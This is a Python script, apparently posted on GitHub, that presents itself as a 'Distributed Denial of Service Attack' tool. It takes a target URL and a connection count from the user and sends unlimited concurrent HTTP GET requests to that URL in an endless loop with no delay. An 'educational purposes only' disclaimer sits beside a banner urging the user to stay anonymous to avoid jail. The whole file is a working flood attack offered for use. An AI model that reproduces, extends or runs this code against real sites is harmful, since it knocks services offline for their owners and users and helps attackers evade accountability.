import httpx
import asyncio
import os
import subprocess
import time

paused = False  # Variable to track the pause state

async def visit_url(session, url, request_counter):
    global paused
    try:
        response = await session.get(url)
        request_counter += 1
        print(f"\033[93m  < packet sent! > {url}\033[0m, \033[92m# Status Code: {response.status_code}, # Requests Sent: {request_counter}\033[0m")
    except httpx.HTTPError as e:
        print(f"\033[91mFailed to send packet, maybe the server is down # Requests Sent: {request_counter}\033[0m")

async def start_bot(url, num_connections=0, batch_size=100):
    global paused
    request_counter = 0
    async with httpx.AsyncClient() as client:
        while True:
            tasks = []
            for _ in range(num_connections):
                tasks.append(visit_url(client, url, request_counter))
                request_counter += 1

            # Continue with tasks
            await asyncio.gather(*tasks)

            # Adjust sleep time if needed
            await asyncio.sleep(0)

if __name__ == "__main__":
    def check_install(package_name, install_command):
        try:
            __import__(package_name)
        except ImportError:
            print(f"{package_name} is not installed. Installing...")
            subprocess.run(install_command, shell=True)
            print(f"{package_name} has been installed.")

    # Check and install httpx
    check_install("httpx", "pip install httpx")

    os.system("clear")

                              
    os.system("figlet SD Pro")  # Fix typo: os.sysrem -> os.system
    
    print(" ")
    print(" ")
    print("\033[94mSD Pro Distributed Denial of Service Attack Pro ")
    print(" ")
    print("\033[95m                             ~ By vyasanbmathew5")
    print(" ")
    print("\033[96m               [ www.github.com/vyasanbmathew5 ]")
    print("")
    
    print("")
    print("\033[91mDisclaimer : This tool is intended strictly for educational purposes to understand network security and should only be used in environments where you have explicit authorization.\033[0m")
    print("\033[91mI am not responsible for any kind of damage or problems. Use at your own risk.\033[0m")
    print("")
    print("\033[91mYour IP is public, make sure you are anonymous\033[0m")
    print("")
    print("\033[93mIf you just know how ddos attack works and dont know how ethicals hackers track you even you use tor vpn then stay away from this othervise welcome to jail.\033[0m")
    print("")
    url = input("\033[94m \033[1m@root \033[91m\033[96m[ \033[91m+ \033[96m]\033[94m Enter the Target URL : \033[91m")
    time.sleep(1)
    print("")
    print("\033[93m<><><><><><><><><><><><><><><><><<><><>\033[0m ")
    print("\033[91mTarget : \033[0m", url)
    print("\033[93m<><><><><><><><><><><><><><><><><<><><> \033[0m")
    print("")
    conc = int(input("Enter the number of connections: "))
    print("\033[93m<><><><><><><><><><><><><><><><><<><><> \033[0m")
    
    print("\033[91mConnections = \033[0m", conc)
    print("")
    os.system("clear")
    os.system("figlet Starting the DDoS attack")
    time.sleep(2) 
    asyncio.run(start_bot(url, num_connections=conc))

